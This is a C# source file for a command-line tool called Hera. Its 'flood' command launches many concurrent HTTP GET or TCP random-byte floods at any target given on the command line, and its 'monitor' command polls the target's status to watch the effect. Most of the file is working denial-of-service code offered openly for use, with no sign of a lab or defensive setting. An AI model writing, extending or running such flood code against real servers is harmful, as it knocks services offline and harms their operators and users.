using System.Net;
using System.Net.Sockets;

using Flurl.Http;
using Cocona;

using Hera.Monitor;

namespace Hera
{
    class Program
    {
        static object LockObject { get; set; } = new object();
        static long AttackCount { get; set; } = default;

        static CancellationTokenSource? cancelSource = default;

        static void UpdateCount(int newCount = -1)
        {
            try
            {
                lock (LockObject)
                {
                    if (newCount == -1)
                    {
                        if (AttackCount < long.MaxValue)
                            ++AttackCount;
                    }
                    else
                        AttackCount = newCount;

                    Console.Write("\r");
                    Console.Write($"Attack Count = {AttackCount}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void OutputResult(string resultText) => Console.WriteLine($"[{DateTime.Now:yy/MM/dd HH:mm:ss}] Result : {resultText}");

        static async Task HTTPAttackAction(string target, int minIntervals, int maxIntervals, CancellationToken token)
        {
            try
            {
                var random = new Random();
                UpdateCount(0);

                while (true)
                {
                    token.ThrowIfCancellationRequested();

                    _ = target.GetAsync(token);

                    UpdateCount();
                    await Task.Delay(random.Next(minIntervals, maxIntervals), token);
                }
            }
            catch (OperationCanceledException) { }
            catch (AggregateException ex)
            {
                Console.WriteLine(ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static async Task TCPAttackAction(IPAddress target, int port, int minIntervals, int maxIntervals, int timeout, int buffer, CancellationToken token)
        {
            try
            {
                var random = new Random();
                UpdateCount(0);

                while (true)
                {
                    try
                    {
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        await Task.Run(() => socket.Connect(new IPEndPoint(target, port))).WaitAsync(TimeSpan.FromMilliseconds(timeout), token);

                        var bytes = new byte[buffer];
                        while (true)
                        {
                            token.ThrowIfCancellationRequested();

                            random.NextBytes(bytes);
                            await socket.SendAsync(bytes, SocketFlags.None, token);

                            UpdateCount();
                            await Task.Delay(random.Next(minIntervals, maxIntervals), token);
                        }
                    }
                    catch (OperationCanceledException) { return; }
                    catch (Exception) { }
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return;
            }
        }

        static async Task HTTPMonitorAction(string target, int minIntervals, int maxIntervals, int timeout, CancellationToken token)
        {
            try
            {
                var random = new Random();
                while (true)
                {
                    token.ThrowIfCancellationRequested();
                    OutputResult(await HTTPMonitor.GetStatus(target, timeout, token));
                    await Task.Delay(random.Next(minIntervals, maxIntervals), token);
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                OutputResult("An exception has been caught");
                Console.WriteLine(ex);
            }
        }

        static async Task TCPMonitorAction(IPAddress target, int port, int minIntervals, int maxIntervals, int timeout, CancellationToken token)
        {
            try
            {
                var random = new Random();

                while (true)
                {
                    OutputResult(await TCPMonitor.GetStatus(target, port, timeout, token));
                    await Task.Delay(random.Next(minIntervals, maxIntervals), token);
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                OutputResult("An exception has been caught");
                Console.WriteLine(ex);
            }
        }

        static async Task Main()
        {
            var cocona = CoconaLiteApp.Create();
            var taskList = new List<Task>();

            Console.CancelKeyPress += (sender, e) =>
            {
                try
                {
                    cancelSource?.Cancel();
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex);
                }
            };

            cocona.AddCommand("flood", async ([Option("type", Description = "The type of flood attack (HTTP/TCP)")] string type,
                                              [Option("ip", Description = "The IP Address")] string ipAddress,
                                              [Option("th", Description = "Number of threads used")] int? thread,
                                              [Option("min", Description = "Minimum attack interval")] int ? minIntervals,
                                              [Option("max", Description = "Maximum attack interval (must > min argument)")] int? maxIntervals,
                                              [Option("timeout", new char[] { 'w' }, Description = "Connection time limit (TCP Type Only)")] int? timeout,
                                              [Option("buffer", Description = "Attack buffer (TCP Tyne Only)")] int? buffer) =>
            {
                switch (type.ToLower())
                {
                    case "http":
                        {
                            // 验证目标, 防止用户忘记输入 http/https
                            if (ipAddress.IndexOf("http") == -1)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Warning: Target without protocol (http/https) may be invalid");
                                Console.ResetColor();
                            }

                            try
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"{ipAddress} Status = {await HTTPMonitor.GetStatus(ipAddress, 10000, default)}");
                                Console.ResetColor();
                            }
                            catch { }

                            cancelSource = new();
                            for (int i = 0; i < (thread ?? 10); ++i)
                                taskList.Add(Task.Run(() => HTTPAttackAction(ipAddress, minIntervals ?? 50, maxIntervals ?? 400, cancelSource.Token)));

                            break;
                        }

                    case "tcp":
                        {
                            var splitArray = ipAddress.Split(':');
                            var target = TCPMonitor.GetIPAddress(splitArray[0]);
                            var port = int.Parse(splitArray.Length == 2 ? splitArray[1] : "80");

                            // 验证目标, 防止用户输入非法目标
                            if (ipAddress.IndexOf("/") != -1)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Warning: Target may be invalid");
                                Console.ResetColor();
                            }

                            try
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"{target} ({ipAddress}) Status = {await TCPMonitor.GetStatus(target, port, 10000, default)}");
                                Console.ResetColor();
                            }
                            catch { }

                            cancelSource = new();
                            for (int i = 0; i < (thread ?? 10); ++i)
                                taskList.Add(Task.Run(() => TCPAttackAction(target, port, minIntervals ?? 20, maxIntervals ?? 80, timeout ?? 10000, buffer ?? 4 * 1024, cancelSource.Token)));

                            break;
                        }

                    default:
                        {
                            Console.WriteLine("Wrong type");
                            return;
                        }
                }

                Task.WaitAll(taskList.ToArray());
            })
            .WithDescription("Launch a flood attack");

            cocona.AddCommand("monitor", async ([Option("type", Description = "The type of monitor (Http/TCP)")] string type, 
                                                [Option("ip", Description = "The IP Address")] string ipAddress,
                                                [Option("min", Description = "Minimum attack interval")] int? minIntervals,
                                                [Option("max", Description = "Maximum attack interval (must be greater than min argument)")] int? maxIntervals,
                                                [Option("timeout", new char []{'w' }, Description = "Connection time limit")] int? timeout) =>
            {
                switch (type.ToLower())
                {
                    case "http":
                        {
                            // 验证目标, 防止用户忘记输入 http/https
                            if (ipAddress.IndexOf("http") == -1)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Warning: Target without protocol (http/https) may be invalid");
                                Console.ResetColor();
                            }

                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.Write($"Start monitoring ");
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.Write(ipAddress);
                            Console.ResetColor();
                            Console.WriteLine();

                            cancelSource = new();
                            await HTTPMonitorAction(ipAddress, minIntervals ?? 15000, maxIntervals ?? 45000, timeout ?? 10000, cancelSource.Token);
                            break;
                        }

                    case "tcp":
                        {
                            var splitArray = ipAddress.Split(':');
                            var target = TCPMonitor.GetIPAddress(splitArray[0]);
                            var port = int.Parse(splitArray.Length == 2 ? splitArray[1] : "80");

                            // 验证目标, 防止用户输入非法目标
                            if (ipAddress.IndexOf("/") != -1)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Warning: Target may be invalid");
                                Console.ResetColor();
                            }

                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.Write($"Start monitoring ");
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.Write($"{target}:{port} ({ipAddress})");
                            Console.ResetColor();
                            Console.WriteLine();

                            cancelSource = new();
                            await TCPMonitorAction(target, port, minIntervals ?? 15000, maxIntervals ?? 45000, timeout ?? 10000, cancelSource.Token);
                            break;
                        }

                    default:
                        {
                            Console.WriteLine("Wrong type");
                            return;
                        }
                }
            })
            .WithDescription("Monitor the status of the server");

            await cocona.RunAsync();
        }
    }
}